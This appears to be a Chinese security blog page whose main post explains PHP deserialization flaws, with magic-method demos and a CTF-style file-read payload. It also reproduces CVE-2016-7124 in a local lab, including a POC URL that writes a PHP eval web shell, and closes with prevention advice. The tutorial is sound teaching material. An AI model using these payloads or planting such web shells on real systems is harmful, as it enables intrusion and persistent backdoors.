    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/24/php-unserialize/" class="post-title-link" itemprop="url">理解PHP反序列化原理及利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-24 15:48:16" itemprop="dateCreated datePublished" datetime="2021-03-24T15:48:16+08:00">2021-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-13 16:23:05" itemprop="dateModified" datetime="2021-04-13T16:23:05+08:00">2021-04-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-原理解释"><a href="#0x01-原理解释" class="headerlink" title="0x01 原理解释"></a>0x01 原理解释</h2><blockquote>
<p><strong>PHP的反序列化漏洞</strong>其实是PHP对象的属性篡改漏洞。漏洞的成因在于代码中unserialize的参数不可控。导致服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进魔术方法里面执行以实现攻击. </p>
</blockquote>
<blockquote>
<p>PHP unserialization vulnerability is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.**PHP deserialization vulnerability ** is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.</p>
</blockquote>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h3><ol>
<li>php源码同python一样是由c所写</li>
<li>可以序列化的对象都可以反序列化</li>
<li>序列化只序列化对象的属性，不序列化方法</li>
<li>如果希望PHP调用魔术方法，必须首先在类中定义，否则PHP不会执行未创建的魔术方法。</li>
<li>序列化后包括，类为object,类长度为4，名为test,包含3个属性：<br> 第一个属性为string,长度为10，名为testflag;值长度为6，名为active；因为<strong>prvate</strong>,故而序列化后，原名test被更改<br> 第二个同上; 因为<strong>protected</strong>，故而序列化后,原名前加*<br> 第三个同上; 因为<strong>public</strong>，故而序列化后,原名不变<br> <img src="/2021/03/24/php-unserialize/1.jpg"><br> private序列化后格式：\x00+类名+\x00+属性名<br> <img src="/2021/03/24/php-unserialize/2.png"><br> protected序列化后格式：\x00+*+\x00+属性名<br> <img src="/2021/03/24/php-unserialize/3.png"></li>
<li>可能有人会问为什么要序列化，因为要使复杂数据写入进程间内存、文件或数据库更容易。所以采取序列化，将复杂的数据结构(对象及其属性)转换成“更扁平”的格式，作为字节顺序流传输。而反序列化将字节流还原为原始对象，方便与网站逻辑交互。</li>
</ol>
<h3 id="2-魔术方法"><a href="#2-魔术方法" class="headerlink" title="2. 魔术方法"></a>2. 魔术方法</h3><p>魔术方法(按照常见度排序)：以两个下划线__开头，包括：<br>(1)__construct()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)<br>(2)__sleep()，执行serialize()时，先会调用这个函数<br>(3)__wakeup()，unserialize()时，先会调用这个函数<br>(4)__destruct()，类的析构函数，当对象被销毁时会自动调用<br>(5)__toString()，类被当成字符串时的回应方法。当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(6)__get()，获得一个类的成员变量时调用。当从不可访问的属性读取数据<br>(7)__call()，在对象中调用一个不可访问方法时调用<br>(8)__callStatic()，用静态方式中调用一个不可访问方法时调用<br>(9)__set()，设置一个类的成员变量时调用</p>
<hr>
<p>其中，__toString()触发条件较多，包括以下：</p>
<p>(1)echo ($obj) / print($obj) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
<h3 id="3-序列化与反序列化"><a href="#3-序列化与反序列化" class="headerlink" title="3. 序列化与反序列化"></a>3. 序列化与反序列化</h3><p>序列化$data并输出到serialize.txt文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &#39;test&#39;;</span><br><span class="line">    public $test1 &#x3D; &#39;test1&#39;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function get_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object &#x3D; new test();</span><br><span class="line">$object-&gt;set_flag(&#39;active&#39;);</span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">file_put_contents(&quot;serialize.txt&quot;,$data);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
<p>反序列化serialize.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &quot;test&quot;;</span><br><span class="line">    public $test1 &#x3D; &quot;test1&quot;;</span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; file_get_contents(&quot;serialize.txt&quot;);</span><br><span class="line">$data &#x3D; unserialize($data);</span><br><span class="line">echo $data-&gt;test1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $data-&gt;get_flag(); &#x2F;&#x2F; correspond to serialize.php</span><br></pre></td></tr></table></figure>
<p>魔术方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class swanQ</span><br><span class="line">&#123;</span><br><span class="line">    private $name &#x3D; &#39;swanQ&#39;;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__construct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__sleep&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        return array(&#39;name&#39;); &#x2F;&#x2F;**</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__wakeup&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return &quot;__toString&quot;.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object &#x3D; new swanQ();</span><br><span class="line"></span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">$object1 &#x3D; unserialize($data);</span><br><span class="line">print $object1;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/24/php-unserialize/4.png"><br>新建一个对象时，会自动调用__construct()方法,<br>执行serialize前，会先调用共__sleep()方法<br>执行unserialize前，会先调用__wakeup()方法<br>__destruct()了两次说明，当前有两个对象，一个是将类实例化为对象的时候产生的，一个是反序列化后生成的对象。</p>
<h3 id="4-攻击示例"><a href="#4-攻击示例" class="headerlink" title="4.攻击示例"></a>4.攻击示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in ctf.php</span><br><span class="line">class Shield&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($filename &#x3D; &#39;&#39;)&#123;</span><br><span class="line">        $this-&gt;file &#x3D; $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    function readfile()&#123;</span><br><span class="line">        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;) &#x3D;&#x3D;&#x3D; FALSE</span><br><span class="line">        &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;) &#x3D;&#x3D;&#x3D; FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;&#x3D;FALSE)&#123;</span><br><span class="line">            return @file_get_contents($this-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>shield.php,类中存在属性$file,且file会调用__construct方法。所以我们利用file即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once (&#39;shield.php&#39;);</span><br><span class="line">$x &#x3D; new Shield();</span><br><span class="line">isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">if (!empty($g))&#123;</span><br><span class="line">    $x &#x3D; unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line">echo $x-&gt;readfile();</span><br></pre></td></tr></table></figure>
<p>包含shield.php,new实例时会调用__construct()方法，然后接收用户的反序列化并输出。<br>payload:直接构造序列化对象作为file的内容，O:6:”Shield”:1{s:4:”file”;s:8:”ctf.php”;}</p>
<h2 id="0x02-php绕过-wakeup：-CVE-2016-7124"><a href="#0x02-php绕过-wakeup：-CVE-2016-7124" class="headerlink" title="0x02 php绕过__wakeup： CVE-2016-7124"></a>0x02 php绕过__wakeup： CVE-2016-7124</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>执行unserialize恢复对象时，会先调用__wakeup()成员函数, 但是当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p>
<p>漏洞概述: wakeup()魔法函数被绕过,导致执行了一些非预期效果的漏洞<br>漏洞原理: 当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</p>
<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><ul>
<li><p>漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
</li>
<li><p>复现环境</p>
<p>php5.4.5nts+apache+mysql（phpstudy）</p>
<p>phpinfo环境搭建成功，其中test.php,233.php均在www目录下。</p>
</li>
<li><p>编写测试脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>接收参数s，将其反序列化后输出属性name的值。</p>
</li>
</ul>
<p>编写POC访问该脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test.php?s&#x3D;O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/24/php-unserialize/5.png"></p>
<p>反序列化之前先调用了__wakeup方法，再调用__destruct方法。</p>
<p>构造payload将传入的序列化数据的对象变量个数由1加至2，绕过__wakeup方法执行。–反序列化数据失败无法创建对象的原因</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;fairy&quot;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/24/php-unserialize/6.png"></p>
<p>页面只执行__destruct方法，没有输出name,是因为反序列化数据失败，导致无法创建对象。</p>
<p>修改测试脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $name &#x3D; &quot;fairy&quot;;</span><br><span class="line"></span><br><span class="line">    public function  __wakeup()&#123;</span><br><span class="line">        echo &quot;this is wakeup&lt;br&gt;&quot;;</span><br><span class="line">        foreach(get_object_vars($this) as $k &#x3D;&gt; $v)&#123;</span><br><span class="line">            $this-&gt;$k &#x3D; null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;this is destruct&lt;br&gt;&quot;;</span><br><span class="line">        $fp &#x3D; fopen(&quot;D:\\phpstudy\\PHPTutorial\\WWW\\233.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;name);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; $_GET[&quot;s&quot;];</span><br><span class="line">@$un_str &#x3D; unserialize($str);</span><br><span class="line"></span><br><span class="line">echo  $un_str-&gt;name.&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造POC写入一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test.php?s&#x3D;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:29:&quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/03/24/php-unserialize/8.png"></p>
<p>此时调用destruct方法会将name参数写入233.php文件，但windows弹窗自动禁止。</p>
<p>一句话木马被写入233.php。</p>
<h2 id="0x03-寻找php反序列化漏洞的流程"><a href="#0x03-寻找php反序列化漏洞的流程" class="headerlink" title="0x03 寻找php反序列化漏洞的流程"></a>0x03 寻找php反序列化漏洞的流程</h2><ul>
<li>寻找unserialize()函数的参数是否有可控点</li>
<li>寻找存在wakeup()或destruct()魔术方法的类</li>
<li>逐层研究该类在魔术方法种使用的属性及属性调用的方法，看是否有在当前调用种可以触发的可控属性</li>
<li>复制部分代码，构造序列化攻击</li>
</ul>
<h2 id="如何防止"><a href="#如何防止" class="headerlink" title="如何防止"></a>如何防止</h2><p>一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。</p>
<p>在开始反序列化之前，必须进行检查。如果确实需要反序列化来自不受信任来源的数据，请采用措施以确保数据未被篡改。如可以使用数字签名来检查数据的完整性。</p>
<p>避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] 深入理解PHP反序列化漏洞:<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/">https://www.k0rz3n.com/2018/11/19/</a><br>[2] CVE-2016-7124——php绕过__wakeup():<a target="_blank" rel="noopener" href="http://www.cl4y.top/521/">http://www.cl4y.top/521/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/23/think/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/23/think/" class="post-title-link" itemprop="url">夜思</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-23 22:48:16" itemprop="dateCreated datePublished" datetime="2021-03-23T22:48:16+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-24 19:50:07" itemprop="dateModified" datetime="2021-03-24T19:50:07+08:00">2021-03-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%80%9D%E6%83%B3%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index"><span itemprop="name">思想生活</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>248</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>初学网络安全是因为对于此专业的兴趣</p>
<p>抑或是对于白帽子的向往</p>
<p>但随着现在心态的成熟，看着周围越来越多同是网络空间安全专业的同学走上了开发的道路，真正搞安全的寥寥无几</p>
<p>内心五味杂陈</p>
<p>或许他们有了自己更加热爱的目标吧</p>
<p>但就现在的我而言，就我最近接触到的各位圈内的师傅们而言</p>
<p>尤其是在受了了八佰这部电影的启迪之后的我而言</p>
<p>我内心真实的想法是，我想要不断不断地提高自己的专业素养和专业技能，我想要为我们国家的网络安全事业奉献出属于自己的力量</p>
<p>每当挣扎在现实当中的时候，我相信前方一定有同伴在等着我，一起走在保家卫国的道路上</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">让自己去触碰安全的blue sky</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">58</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">81k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:14</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/page/3/',]
      });
      });
  </script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
